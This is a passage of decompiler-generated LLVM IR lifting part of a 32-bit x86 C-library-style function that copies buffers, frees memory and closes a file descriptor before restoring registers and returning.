  store i32 %v3_80673b5, i32* %eax.global-to-local, align 4
  %v2_80673b8 = add i32 %v0_80673a3, 416
  %v3_80673b8 = inttoptr i32 %v2_80673b8 to i32*
  store i32 %v3_80673b5, i32* %v3_80673b8, align 4
  %v0_80673bf = load i32, i32* %edx.global-to-local, align 4
  %v1_80673bf = add i32 %v0_80673bf, 32
  %v2_80673bf = inttoptr i32 %v1_80673bf to i32*
  %v3_80673bf = load i32, i32* %v2_80673bf, align 4
  store i32 %v3_80673bf, i32* %eax.global-to-local, align 4
  %v1_80673c2 = load i32, i32* @esp, align 4
  %v2_80673c2 = add i32 %v1_80673c2, 420
  %v3_80673c2 = inttoptr i32 %v2_80673c2 to i32*
  store i32 %v3_80673bf, i32* %v3_80673c2, align 4
  %v0_80673c9 = load i32, i32* %edx.global-to-local, align 4
  %v1_80673c9 = add i32 %v0_80673c9, 36
  %v2_80673c9 = inttoptr i32 %v1_80673c9 to i32*
  %v3_80673c9 = load i32, i32* %v2_80673c9, align 4
  store i32 %v3_80673c9, i32* %eax.global-to-local, align 4
  %v1_80673cc = load i32, i32* @esp, align 4
  %v2_80673cc = add i32 %v1_80673cc, 424
  %v3_80673cc = inttoptr i32 %v2_80673cc to i32*
  store i32 %v3_80673c9, i32* %v3_80673cc, align 4
  %v0_80673d3 = load i32, i32* @esp, align 4
  %v9_80673d3 = icmp eq i32 %v0_80673d3, 12
  store i1 %v9_80673d3, i1* %zf.global-to-local, align 1
  %v0_80673d6 = load i32, i32* %edx.global-to-local, align 4
  %v1_80673d6 = inttoptr i32 %v0_80673d6 to i32*
  %v2_80673d6 = load i32, i32* %v1_80673d6, align 4
  %v4_80673d6 = add i32 %v0_80673d3, -16
  %v5_80673d6 = inttoptr i32 %v4_80673d6 to i32*
  store i32 %v2_80673d6, i32* %v5_80673d6, align 4
  %v1_80673d8 = call i32 @free(i32 %v3_8066ee8)
  store i32 %v1_80673d8, i32* %eax.global-to-local, align 4
  store i32 10, i32* %ecx.global-to-local, align 4
  %v0_80673e2 = load i32, i32* @esp, align 4
  %v1_80673e2 = add i32 %v0_80673e2, 20
  %v2_80673e2 = inttoptr i32 %v1_80673e2 to i32*
  %v3_80673e2 = load i32, i32* %v2_80673e2, align 4
  store i32 %v3_80673e2, i32* @esi, align 4
  %v1_80673e6 = add i32 %v0_80673e2, 540
  %v2_80673e6 = inttoptr i32 %v1_80673e6 to i32*
  %v3_80673e6 = load i32, i32* %v2_80673e6, align 4
  %v4_80673e6 = inttoptr i32 %v3_80673e6 to i8*
  store i32 %v3_80673e6, i32* @edi, align 4
  %v4_80673ed = inttoptr i32 %v3_80673e2 to i8*
  %v6_80673ed = call i8* @_memcpy(i8* %v4_80673e6, i8* %v4_80673ed, i32 10)
  %v7_80673ed = ptrtoint i8* %v6_80673ed to i32
  store i32 %v7_80673ed, i32* %ecx.global-to-local, align 4
  %v0_80673ef = load i32, i32* @esp, align 4
  %v1_80673ef = add i32 %v0_80673ef, 540
  %v2_80673ef = inttoptr i32 %v1_80673ef to i32*
  %v3_80673ef = load i32, i32* %v2_80673ef, align 4
  store i32 %v3_80673ef, i32* %ecx.global-to-local, align 4
  %v1_80673f6 = add i32 %v0_80673ef, 16
  %v1_80673f9 = add i32 %v3_80673ef, 4
  %v2_80673f9 = inttoptr i32 %v1_80673f9 to i32*
  %v3_80673f9 = load i32, i32* %v2_80673f9, align 4
  store i32 %v3_80673f9, i32* @eax, align 4
  %v9_80673fc = icmp eq i32 %v3_80673f9, 24
  store i1 %v9_80673fc, i1* %zf.global-to-local, align 1
  br i1 %v9_80673fc, label %dec_label_pc_80673ae.dec_label_pc_8067423_crit_edge, label %dec_label_pc_8067401

dec_label_pc_80673ae.dec_label_pc_8067423_crit_edge: ; preds = %dec_label_pc_80673ae
  %.pre = add i32 %v0_80673ef, 532
  %.pre31 = inttoptr i32 %.pre to i32*
  %v4_8067423.pre = load i32, i32* %.pre31, align 4
  br label %dec_label_pc_8067423

dec_label_pc_8067401:                             ; preds = %dec_label_pc_80673ae
  %v1_8067401 = add i32 %v3_80673ef, 28
  %v2_8067401 = inttoptr i32 %v1_8067401 to i32*
  %v3_8067401 = load i32, i32* %v2_8067401, align 4
  %v4_8067401 = icmp eq i32 %v3_8067401, 0
  store i1 %v4_8067401, i1* %zf.global-to-local, align 1
  br i1 %v4_8067401, label %dec_label_pc_80674f8, label %dec_label_pc_806740b

dec_label_pc_806740b:                             ; preds = %dec_label_pc_8067401
  %v1_806740b = add i32 %v0_80673ef, 532
  %v2_806740b = inttoptr i32 %v1_806740b to i32*
  %v3_806740b = load i32, i32* %v2_806740b, align 4
  %v12_806740b = icmp eq i32 %v3_806740b, 1
  store i1 %v12_806740b, i1* %zf.global-to-local, align 1
  br i1 %v12_806740b, label %dec_label_pc_8067423, label %dec_label_pc_8067415

dec_label_pc_8067415:                             ; preds = %dec_label_pc_806740b
  %v12_8067415 = icmp eq i32 %v3_806740b, 28
  store i1 %v12_8067415, i1* %zf.global-to-local, align 1
  %v1_806741d = icmp eq i1 %v12_8067415, false
  br i1 %v1_806741d, label %dec_label_pc_80674f8, label %dec_label_pc_8067423

dec_label_pc_8067423:                             ; preds = %dec_label_pc_80673ae.dec_label_pc_8067423_crit_edge, %dec_label_pc_8067415, %dec_label_pc_806740b
  %v4_8067423 = phi i32 [ %v4_8067423.pre, %dec_label_pc_80673ae.dec_label_pc_8067423_crit_edge ], [ %v3_806740b, %dec_label_pc_8067415 ], [ %v3_806740b, %dec_label_pc_806740b ]
  %v15_8067423 = icmp eq i32 %v3_80673f9, %v4_8067423
  store i1 %v15_8067423, i1* %zf.global-to-local, align 1
  %v1_806742a = add i32 %v0_80673ef, 59
  %v2_806742a = inttoptr i32 %v1_806742a to i8*
  store i8 1, i8* %v2_806742a, align 1
  %v0_806742f = load i1, i1* %zf.global-to-local, align 1
  %v1_806742f = icmp eq i1 %v0_806742f, false
  br i1 %v1_806742f, label %dec_label_pc_80674df, label %dec_label_pc_8067435

dec_label_pc_8067435:                             ; preds = %dec_label_pc_8067423
  %v0_8067435 = load i32, i32* @esp, align 4
  %v1_8067435 = add i32 %v0_8067435, 72
  %v2_8067435 = inttoptr i32 %v1_8067435 to i32*
  %v3_8067435 = load i32, i32* %v2_8067435, align 4
  store i32 %v3_8067435, i32* %eax.global-to-local, align 4
  %v1_8067439 = add i32 %v0_8067435, 524
  %v2_8067439 = inttoptr i32 %v1_8067439 to i32*
  %v3_8067439 = load i32, i32* %v2_8067439, align 4
  store i32 %v3_8067439, i32* %edx.global-to-local, align 4
  %v1_8067440 = sub i32 -1, %v3_8067435
  store i32 %v1_8067440, i32* %eax.global-to-local, align 4
  %v2_8067442 = add i32 %v0_8067435, 376
  %v3_8067442 = inttoptr i32 %v2_8067442 to i32*
  %v4_8067442 = load i32, i32* %v3_8067442, align 4
  %v5_8067442 = add i32 %v4_8067442, %v1_8067440
  store i32 %v5_8067442, i32* %eax.global-to-local, align 4
  store i32 %v3_8067439, i32* %ecx.global-to-local, align 4
  %v2_806744b = add i32 %v3_8067439, 36
  %v3_806744b = inttoptr i32 %v2_806744b to i32*
  store i32 %v5_8067442, i32* %v3_806744b, align 4
  %v0_806744e = load i32, i32* %edx.global-to-local, align 4
  %v1_806744e = add i32 %v0_806744e, 16
  %v2_806744e = inttoptr i32 %v1_806744e to i32*
  %v3_806744e = load i32, i32* %v2_806744e, align 4
  %v1_8067451 = add i32 %v3_806744e, 4
  store i32 %v1_8067451, i32* %edx.global-to-local, align 4
  %v0_8067454 = load i32, i32* %eax.global-to-local, align 4
  %v4_8067454 = mul i32 %v0_8067454, %v1_8067451
  store i32 %v4_8067454, i32* @eax, align 4
  %v1_8067457 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8067457 = add i32 %v1_8067457, 32
  %v3_8067457 = inttoptr i32 %v2_8067457 to i32*
  %v4_8067457 = load i32, i32* %v3_8067457, align 4
  %v15_8067457 = icmp eq i32 %v4_8067454, %v4_8067457
  store i1 %v15_8067457, i1* %zf.global-to-local, align 1
  %tmp85 = icmp ugt i32 %v4_8067454, %v4_8067457
  br i1 %tmp85, label %dec_label_pc_8067435.dec_label_pc_80674f8.loopexit_crit_edge, label %dec_label_pc_8067460

dec_label_pc_8067435.dec_label_pc_80674f8.loopexit_crit_edge: ; preds = %dec_label_pc_8067435
  %v0_80674f8.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80674f8

dec_label_pc_8067460:                             ; preds = %dec_label_pc_8067435
  %v1_8067460 = add i32 %v1_8067457, 36
  %v2_8067460 = inttoptr i32 %v1_8067460 to i32*
  store i32 0, i32* %v2_8067460, align 4
  %v0_8067467 = load i32, i32* @esp, align 4
  %v1_8067467 = add i32 %v0_8067467, 43
  %v2_8067467 = inttoptr i32 %v1_8067467 to i8*
  store i8 0, i8* %v2_8067467, align 1
  br label %dec_label_pc_80674df

dec_label_pc_806746e:                             ; preds = %dec_label_pc_80673a3
  %v9_806746e = icmp eq i32 %v0_80673a3, 12
  store i1 %v9_806746e, i1* %zf.global-to-local, align 1
  %v1_8067471 = add i32 %v0_80673a3, 388
  %v2_8067471 = inttoptr i32 %v1_8067471 to i32*
  %v3_8067471 = load i32, i32* %v2_8067471, align 4
  %v5_8067471 = add i32 %v0_80673a3, -16
  %v6_8067471 = inttoptr i32 %v5_8067471 to i32*
  store i32 %v3_8067471, i32* %v6_8067471, align 4
  %v1_8067478 = call i32 @free(i32 %v3_8066ee8)
  store i32 %v1_8067478, i32* %eax.global-to-local, align 4
  %v0_806747d = load i32, i32* @esp, align 4
  %v1_8067480 = add i32 %v0_806747d, 532
  %v2_8067480 = inttoptr i32 %v1_8067480 to i32*
  %v3_8067480 = load i32, i32* %v2_8067480, align 4
  store i32 %v3_8067480, i32* @eax, align 4
  %v1_8067487 = add i32 %v0_806747d, 408
  %v2_8067487 = inttoptr i32 %v1_8067487 to i32*
  %v3_8067487 = load i32, i32* %v2_8067487, align 4
  %v15_8067487 = icmp eq i32 %v3_8067487, %v3_8067480
  store i1 %v15_8067487, i1* %zf.global-to-local, align 1
  %v1_806748e = icmp eq i1 %v15_8067487, false
  br i1 %v1_806748e, label %dec_label_pc_80674df, label %dec_label_pc_8067490

dec_label_pc_8067490:                             ; preds = %dec_label_pc_806746e
  %v1_8067490 = add i32 %v0_806747d, 540
  %v2_8067490 = inttoptr i32 %v1_8067490 to i32*
  %v3_8067490 = load i32, i32* %v2_8067490, align 4
  store i32 %v3_8067490, i32* %edx.global-to-local, align 4
  %v1_8067497 = add i32 %v0_806747d, 420
  %v2_8067497 = inttoptr i32 %v1_8067497 to i32*
  %v3_8067497 = load i32, i32* %v2_8067497, align 4
  store i32 %v3_8067497, i32* %eax.global-to-local, align 4
  %v1_806749e = add i32 %v3_8067490, 16
  %v2_806749e = inttoptr i32 %v1_806749e to i32*
  %v3_806749e = load i32, i32* %v2_806749e, align 4
  %v15_806749e = icmp eq i32 %v3_806749e, %v3_8067497
  store i1 %v15_806749e, i1* %zf.global-to-local, align 1
  br i1 %v15_806749e, label %dec_label_pc_80674b5, label %dec_label_pc_80674a3

dec_label_pc_80674a3:                             ; preds = %dec_label_pc_8067490
  %v9_80674a3 = icmp eq i32 %v0_806747d, -4
  store i1 %v9_80674a3, i1* %zf.global-to-local, align 1
  %v1_80674a6 = inttoptr i32 %v3_8067490 to i32*
  %v2_80674a6 = load i32, i32* %v1_80674a6, align 4
  %v5_80674a6 = inttoptr i32 %v0_806747d to i32*
  store i32 %v2_80674a6, i32* %v5_80674a6, align 4
  %v1_80674a8 = call i32 @free(i32 %v3_8066ee8)
  store i32 %v1_80674a8, i32* @eax, align 4
  %v0_80674ad = load i32, i32* @esp, align 4
  %v1_80674ad = add i32 %v0_80674ad, 16
  %v6_80674ad = icmp eq i32 %v1_80674ad, 0
  store i1 %v6_80674ad, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8067536

dec_label_pc_80674b5:                             ; preds = %dec_label_pc_8067490
  %v2_80674b5 = add i32 %v0_806747d, 12
  %v3_80674b5 = inttoptr i32 %v2_80674b5 to i32*
  store i32 %v3_8067490, i32* %v3_80674b5, align 4
  %v0_80674b6 = load i32, i32* %eax.global-to-local, align 4
  %v2_80674b6 = add i32 %v0_806747d, 8
  %v3_80674b6 = inttoptr i32 %v2_80674b6 to i32*
  store i32 %v0_80674b6, i32* %v3_80674b6, align 4
  %v1_80674b7 = add i32 %v0_806747d, 424
  %v2_80674b7 = inttoptr i32 %v1_80674b7 to i32*
  %v3_80674b7 = load i32, i32* %v2_80674b7, align 4
  %v5_80674b7 = add i32 %v0_806747d, 4
  %v6_80674b7 = inttoptr i32 %v5_80674b7 to i32*
  store i32 %v3_80674b7, i32* %v6_80674b7, align 4
  %v3_80674be = load i32, i32* %v2_8067490, align 4
  store i32 %v3_80674be, i32* %ecx.global-to-local, align 4
  %v0_80674c5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80674c5 = add i32 %v3_80674be, 36
  %v3_80674c5 = inttoptr i32 %v2_80674c5 to i32*
  %v4_80674c5 = load i32, i32* %v3_80674c5, align 4
  %v7_80674c5 = mul i32 %v4_80674c5, %v0_80674c5
  store i32 %v7_80674c5, i32* %eax.global-to-local, align 4
  %v2_80674c9 = add i32 %v3_80674be, 28
  %v3_80674c9 = inttoptr i32 %v2_80674c9 to i32*
  %v4_80674c9 = load i32, i32* %v3_80674c9, align 4
  %v5_80674c9 = add i32 %v4_80674c9, %v7_80674c5
  %v15_80674c9 = icmp eq i32 %v5_80674c9, 0
  store i1 %v15_80674c9, i1* %zf.global-to-local, align 1
  store i32 %v5_80674c9, i32* %eax.global-to-local, align 4
  %v3_80674cc = inttoptr i32 %v0_806747d to i32*
  store i32 %v5_80674c9, i32* %v3_80674cc, align 4
  %v4_80674cd = call i32 @memcpy(i8* %v3_8066fdb, i32 %v3_8066e48, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80674cd, i32* %eax.global-to-local, align 4
  %v0_80674d2 = load i32, i32* @esp, align 4
  %v1_80674d2 = add i32 %v0_80674d2, 540
  %v2_80674d2 = inttoptr i32 %v1_80674d2 to i32*
  %v3_80674d2 = load i32, i32* %v2_80674d2, align 4
  store i32 %v3_80674d2, i32* @eax, align 4
  %v1_80674dc = add i32 %v3_80674d2, 36
  %v2_80674dc = inttoptr i32 %v1_80674dc to i32*
  %v3_80674dc = load i32, i32* %v2_80674dc, align 4
  %v4_80674dc = add i32 %v3_80674dc, 1
  %v11_80674dc = icmp eq i32 %v4_80674dc, 0
  store i1 %v11_80674dc, i1* %zf.global-to-local, align 1
  store i32 %v4_80674dc, i32* %v2_80674dc, align 4
  br label %dec_label_pc_80674df

dec_label_pc_80674df:                             ; preds = %dec_label_pc_806746e, %dec_label_pc_8067423, %dec_label_pc_8067460, %dec_label_pc_80674b5
  %v0_80674df = load i32, i32* @esp, align 4
  %v1_80674df = add i32 %v0_80674df, 64
  %v2_80674df = inttoptr i32 %v1_80674df to i32*
  %v3_80674df = load i32, i32* %v2_80674df, align 4
  %v4_80674df = load i32, i32* @ebx, align 4
  %v5_80674df = add i32 %v4_80674df, %v3_80674df
  store i32 %v5_80674df, i32* %v2_80674df, align 4
  %v0_80674e3 = load i32, i32* @esp, align 4
  %v1_80674e3 = add i32 %v0_80674e3, 72
  %v2_80674e3 = inttoptr i32 %v1_80674e3 to i32*
  %v3_80674e3 = load i32, i32* %v2_80674e3, align 4
  %v4_80674e3 = add i32 %v3_80674e3, 1
  %v11_80674e3 = icmp eq i32 %v4_80674e3, 0
  store i1 %v11_80674e3, i1* %zf.global-to-local, align 1
  store i32 %v4_80674e3, i32* %v2_80674e3, align 4
  br label %dec_label_pc_80674e7

dec_label_pc_80674e7:                             ; preds = %dec_label_pc_8067272, %dec_label_pc_80674df
  %v0_80674e7 = load i32, i32* @esp, align 4
  %v1_80674e7 = add i32 %v0_80674e7, 72
  %v2_80674e7 = inttoptr i32 %v1_80674e7 to i32*
  %v3_80674e7 = load i32, i32* %v2_80674e7, align 4
  store i32 %v3_80674e7, i32* %edx.global-to-local, align 4
  %v2_80674eb = add i32 %v0_80674e7, 376
  %v3_80674eb = inttoptr i32 %v2_80674eb to i32*
  %v4_80674eb = load i32, i32* %v3_80674eb, align 4
  %v5_80674eb = sub i32 %v3_80674e7, %v4_80674eb
  %v11_80674eb = xor i32 %v4_80674eb, %v3_80674e7
  %v12_80674eb = xor i32 %v5_80674eb, %v3_80674e7
  %v13_80674eb = and i32 %v12_80674eb, %v11_80674eb
  %v14_80674eb = icmp slt i32 %v13_80674eb, 0
  %v15_80674eb = icmp eq i32 %v5_80674eb, 0
  store i1 %v15_80674eb, i1* %zf.global-to-local, align 1
  %v16_80674eb = icmp slt i32 %v5_80674eb, 0
  %v2_80674f2 = icmp eq i1 %v16_80674eb, %v14_80674eb
  br i1 %v2_80674f2, label %dec_label_pc_80674f8, label %dec_label_pc_806729c

dec_label_pc_80674f8:                             ; preds = %dec_label_pc_8067390, %dec_label_pc_80674e7, %dec_label_pc_8067415, %dec_label_pc_8067401, %dec_label_pc_8067435.dec_label_pc_80674f8.loopexit_crit_edge
  %v0_80674f8 = phi i32 [ %v0_80674f8.pre.pre, %dec_label_pc_8067435.dec_label_pc_80674f8.loopexit_crit_edge ], [ %v0_80674e7, %dec_label_pc_80674e7 ], [ %v1_80673f6, %dec_label_pc_8067415 ], [ %v1_80673f6, %dec_label_pc_8067401 ], [ %v0_8067390, %dec_label_pc_8067390 ]
  %v9_80674f8 = icmp eq i32 %v0_80674f8, 12
  store i1 %v9_80674f8, i1* %zf.global-to-local, align 1
  %v1_80674fb = add i32 %v0_80674f8, 32
  %v2_80674fb = inttoptr i32 %v1_80674fb to i32*
  %v3_80674fb = load i32, i32* %v2_80674fb, align 4
  %v5_80674fb = add i32 %v0_80674f8, -16
  %v6_80674fb = inttoptr i32 %v5_80674fb to i32*
  store i32 %v3_80674fb, i32* %v6_80674fb, align 4
  %v1_80674ff = call i32 @__GI___libc_close(i32 %v3_8066ee8)
  store i32 %v1_80674ff, i32* %eax.global-to-local, align 4
  %v0_8067504 = load i32, i32* @esp, align 4
  %v1_8067507 = add i32 %v0_8067504, 536
  %v2_8067507 = inttoptr i32 %v1_8067507 to i32*
  %v3_8067507 = load i32, i32* %v2_8067507, align 4
  %v4_8067507 = icmp eq i32 %v3_8067507, 0
  store i1 %v4_8067507, i1* %zf.global-to-local, align 1
  br i1 %v4_8067507, label %dec_label_pc_806751c, label %dec_label_pc_8067511

dec_label_pc_8067511:                             ; preds = %dec_label_pc_80674f8
  store i32 %v3_8067507, i32* %ecx.global-to-local, align 4
  %v3_8067518 = inttoptr i32 %v3_8067507 to i32*
  store i32 %v2_8066e3e, i32* %v3_8067518, align 4
  %v0_8067528.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8067528

dec_label_pc_806751c:                             ; preds = %dec_label_pc_80674f8
  %v9_806751c = icmp eq i32 %v0_8067504, -4
  store i1 %v9_806751c, i1* %zf.global-to-local, align 1
  %v4_806751f = inttoptr i32 %v0_8067504 to i32*
  store i32 %v2_8066e3e, i32* %v4_806751f, align 4
  %v1_8067520 = call i32 @free(i32 %v3_8066ee8)
  store i32 %v1_8067520, i32* %eax.global-to-local, align 4
  %v0_8067525 = load i32, i32* @esp, align 4
  %v1_8067525 = add i32 %v0_8067525, 16
  %v6_8067525 = icmp eq i32 %v1_8067525, 0
  store i1 %v6_8067525, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8067528

dec_label_pc_8067528:                             ; preds = %dec_label_pc_8067511, %dec_label_pc_806751c
  %v0_8067528 = phi i32 [ %v0_8067528.pre, %dec_label_pc_8067511 ], [ %v1_8067525, %dec_label_pc_806751c ]
  %v9_8067528 = icmp eq i32 %v0_8067528, 12
  store i1 %v9_8067528, i1* %zf.global-to-local, align 1
  %v1_806752b = add i32 %v0_8067528, 48
  %v2_806752b = inttoptr i32 %v1_806752b to i32*
  %v3_806752b = load i32, i32* %v2_806752b, align 4
  %v5_806752b = add i32 %v0_8067528, -16
  %v6_806752b = inttoptr i32 %v5_806752b to i32*
  store i32 %v3_806752b, i32* %v6_806752b, align 4
  %v1_806752f = call i32 @free(i32 %v3_8066ee8)
  store i32 %v1_806752f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8067598

dec_label_pc_8067536:                             ; preds = %dec_label_pc_806715e, %dec_label_pc_806714d, %dec_label_pc_8067106, %dec_label_pc_8067250, %dec_label_pc_8067247, %dec_label_pc_80671fb, %dec_label_pc_8067207, %dec_label_pc_806723b, %dec_label_pc_8067390, %dec_label_pc_8067385, %dec_label_pc_80671c6, %dec_label_pc_80670b9, %dec_label_pc_8067097, %dec_label_pc_80674a3
  %v17_8067536 = phi i32 [ %v0_8067390, %dec_label_pc_8067390 ], [ %v0_8067390, %dec_label_pc_8067385 ], [ %v1_8067171, %dec_label_pc_80671c6 ], [ %v1_80670cd, %dec_label_pc_80670b9 ], [ %v1_80670ae, %dec_label_pc_8067097 ], [ %v1_80674ad, %dec_label_pc_80674a3 ], [ %v0_8067265, %dec_label_pc_806723b ], [ %v0_8067265, %dec_label_pc_8067207 ], [ %v0_8067265, %dec_label_pc_80671fb ], [ %v0_8067265, %dec_label_pc_8067247 ], [ %v0_8067265, %dec_label_pc_8067250 ], [ %v0_8067153, %dec_label_pc_806715e ], [ %v0_8067153, %dec_label_pc_806714d ], [ %v1_8067125, %dec_label_pc_8067106 ]
  %v1_8067536 = add i32 %v17_8067536, 56
  %v2_8067536 = inttoptr i32 %v1_8067536 to i32*
  %v3_8067536 = load i32, i32* %v2_8067536, align 4
  %v4_8067536 = add i32 %v3_8067536, 1
  %v11_8067536 = icmp eq i32 %v4_8067536, 0
  store i1 %v11_8067536, i1* %zf.global-to-local, align 1
  store i32 %v4_8067536, i32* %v2_8067536, align 4
  %v0_806753a = load i32, i32* @esp, align 4
  %v1_806753a = add i32 %v0_806753a, 52
  %v2_806753a = inttoptr i32 %v1_806753a to i32*
  store i32 -1, i32* %v2_806753a, align 4
  br label %dec_label_pc_8067542

dec_label_pc_8067542:                             ; preds = %dec_label_pc_80671ac, %dec_label_pc_8067536
  %v0_8067542 = load i32, i32* @esp, align 4
  %v1_8067542 = add i32 %v0_8067542, 44
  %v2_8067542 = inttoptr i32 %v1_8067542 to i32*
  %v3_8067542 = load i32, i32* %v2_8067542, align 4
  %v4_8067542 = add i32 %v3_8067542, -1
  store i32 %v4_8067542, i32* %v2_8067542, align 4
  %v0_8067546 = load i32, i32* @esp, align 4
  %v1_8067546 = add i32 %v0_8067546, 44
  %v2_8067546 = inttoptr i32 %v1_8067546 to i32*
  %v3_8067546 = load i32, i32* %v2_8067546, align 4
  %v4_8067546 = icmp eq i32 %v3_8067546, 0
  store i1 %v4_8067546, i1* %zf.global-to-local, align 1
  %tmp54 = icmp slt i32 %v3_8067546, 1
  br i1 %tmp54, label %dec_label_pc_806755a, label %dec_label_pc_8066ef0

dec_label_pc_8067552:                             ; preds = %dec_label_pc_806704b, %dec_label_pc_8066f97, %dec_label_pc_8066e99, %dec_label_pc_8066e91, %dec_label_pc_8066e70
  %v0_8067552 = phi i32 [ %v12_8066e4d, %dec_label_pc_8066e70 ], [ %v12_8066e4d, %dec_label_pc_8066e91 ], [ %v12_8066e4d, %dec_label_pc_8066e99 ], [ %v1_806708a, %dec_label_pc_806704b ], [ %v1_806703e, %dec_label_pc_8066f97 ]
  %stack_var_-496.0 = phi i32 [ %tmp, %dec_label_pc_8066e70 ], [ %tmp, %dec_label_pc_8066e91 ], [ %tmp, %dec_label_pc_8066e99 ], [ %v3_8066ee8, %dec_label_pc_806704b ], [ %v3_8066ee8, %dec_label_pc_8066f97 ]
  %v1_8067552 = add i32 %v0_8067552, 32
  %v2_8067552 = inttoptr i32 %v1_8067552 to i32*
  store i32 -1, i32* %v2_8067552, align 4
  %v0_806755f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_806755a

dec_label_pc_806755a:                             ; preds = %dec_label_pc_8067542, %entry, %dec_label_pc_8067552
  %v0_806755f = phi i32 [ %v0_806755f.pre, %dec_label_pc_8067552 ], [ %v12_8066e4d, %entry ], [ %v0_8067546, %dec_label_pc_8067542 ]
  %stack_var_-496.1 = phi i32 [ %stack_var_-496.0, %dec_label_pc_8067552 ], [ %tmp, %entry ], [ %v3_8066ee8, %dec_label_pc_8067542 ]
  store i32 -4, i32* @eax, align 4
  %v1_806755f = add i32 %v0_806755f, 32
  %v2_806755f = inttoptr i32 %v1_806755f to i32*
  %v3_806755f = load i32, i32* %v2_806755f, align 4
  %v13_806755f = icmp eq i32 %v3_806755f, -1
  store i1 %v13_806755f, i1* %zf.global-to-local, align 1
  store i32 -1, i32* inttoptr (i32 -4 to i32*), align 4
  br i1 %v13_806755f, label %dec_label_pc_806755a.dec_label_pc_806757c_crit_edge, label %dec_label_pc_806756d

dec_label_pc_806755a.dec_label_pc_806757c_crit_edge: ; preds = %dec_label_pc_806755a
  %v0_806757c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_806757c

dec_label_pc_806756d:                             ; preds = %dec_label_pc_806755a, %dec_label_pc_80671ea, %dec_label_pc_80671b5
  %stack_var_-496.2 = phi i32 [ %stack_var_-496.1, %dec_label_pc_806755a ], [ %v3_8066ee8, %dec_label_pc_80671b5 ], [ %v3_8066ee8, %dec_label_pc_80671ea ]
  %v0_806756d = load i32, i32* @esp, align 4
  %v9_806756d = icmp eq i32 %v0_806756d, 12
  store i1 %v9_806756d, i1* %zf.global-to-local, align 1
  %v1_8067570 = add i32 %v0_806756d, 32
  %v2_8067570 = inttoptr i32 %v1_8067570 to i32*
  %v3_8067570 = load i32, i32* %v2_8067570, align 4
  %v5_8067570 = add i32 %v0_806756d, -16
  %v6_8067570 = inttoptr i32 %v5_8067570 to i32*
  store i32 %v3_8067570, i32* %v6_8067570, align 4
  %v1_8067574 = call i32 @__GI___libc_close(i32 %stack_var_-496.2)
  store i32 %v1_8067574, i32* %eax.global-to-local, align 4
  %v0_8067579 = load i32, i32* @esp, align 4
  %v1_8067579 = add i32 %v0_8067579, 16
  %v6_8067579 = icmp eq i32 %v1_8067579, 0
  store i1 %v6_8067579, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_806757c

dec_label_pc_806757c:                             ; preds = %dec_label_pc_806755a.dec_label_pc_806757c_crit_edge, %dec_label_pc_806756d
  %v0_806757c = phi i32 [ %v0_806757c.pre, %dec_label_pc_806755a.dec_label_pc_806757c_crit_edge ], [ %v1_8067579, %dec_label_pc_806756d ]
  %stack_var_-496.3 = phi i32 [ %stack_var_-496.1, %dec_label_pc_806755a.dec_label_pc_806757c_crit_edge ], [ %stack_var_-496.2, %dec_label_pc_806756d ]
  %v9_806757c = icmp eq i32 %v0_806757c, 12
  store i1 %v9_806757c, i1* %zf.global-to-local, align 1
  %v1_806757f = add i32 %v0_806757c, 48
  %v2_806757f = inttoptr i32 %v1_806757f to i32*
  %v3_806757f = load i32, i32* %v2_806757f, align 4
  %v5_806757f = add i32 %v0_806757c, -16
  %v6_806757f = inttoptr i32 %v5_806757f to i32*
  store i32 %v3_806757f, i32* %v6_806757f, align 4
  %v1_8067583 = call i32 @free(i32 %stack_var_-496.3)
  store i32 %v1_8067583, i32* %eax.global-to-local, align 4
  %v2_8067588 = load i32, i32* @esp, align 4
  %v3_8067588 = inttoptr i32 %v2_8067588 to i32*
  store i32 %v2_8066e3e, i32* %v3_8067588, align 4
  %v1_806758b = call i32 @free(i32 %stack_var_-496.3)
  store i32 %v1_806758b, i32* %eax.global-to-local, align 4
  %v0_8067590 = load i32, i32* @esp, align 4
  %v1_8067590 = add i32 %v0_8067590, 52
  %v2_8067590 = inttoptr i32 %v1_8067590 to i32*
  store i32 -1, i32* %v2_8067590, align 4
  br label %dec_label_pc_8067598

dec_label_pc_8067598:                             ; preds = %dec_label_pc_8067528, %dec_label_pc_806757c
  %v0_8067598 = load i32, i32* @esp, align 4
  %v1_8067598 = add i32 %v0_8067598, 52
  %v2_8067598 = inttoptr i32 %v1_8067598 to i32*
  %v3_8067598 = load i32, i32* %v2_8067598, align 4
  store i32 %v3_8067598, i32* %eax.global-to-local, align 4
  %v1_806759c = add i32 %v0_8067598, 508
  %v9_806759c = icmp eq i32 %v1_806759c, 0
  store i1 %v9_806759c, i1* %zf.global-to-local, align 1
  %v1_80675a2 = inttoptr i32 %v1_806759c to i32*
  %v2_80675a2 = load i32, i32* %v1_80675a2, align 4
  store i32 %v2_80675a2, i32* @ebx, align 4
  %v3_80675a2 = add i32 %v0_8067598, 512
  %v1_80675a3 = inttoptr i32 %v3_80675a2 to i32*
  %v2_80675a3 = load i32, i32* %v1_80675a3, align 4
  store i32 %v2_80675a3, i32* @esi, align 4
  %v3_80675a3 = add i32 %v0_8067598, 516
  %v1_80675a4 = inttoptr i32 %v3_80675a3 to i32*
  %v2_80675a4 = load i32, i32* %v1_80675a4, align 4
  store i32 %v2_80675a4, i32* @edi, align 4
  %v3_80675a4 = add i32 %v0_8067598, 520
  %v1_80675a5 = inttoptr i32 %v3_80675a4 to i32*
  %v2_80675a5 = load i32, i32* %v1_80675a5, align 4
  store i32 %v2_80675a5, i32* @ebp, align 4
  ret i32 %v3_8067598

; uselistorder directives
  uselistorder i32 %v0_806757c, { 2, 1, 0 }
  uselistorder i32 %v0_806756d, { 1, 2, 0 }
  uselistorder i1 %v13_806755f, { 1, 0 }
  uselistorder i32 %stack_var_-496.1, { 1, 0 }
  uselistorder i32 %v0_8067546, { 0, 2, 1 }
  uselistorder i32 %v0_8067528, { 2, 1, 0 }
  uselistorder i32 %v3_8067507, { 1, 0, 2 }
  uselistorder i32 %v0_8067504, { 1, 0, 2 }
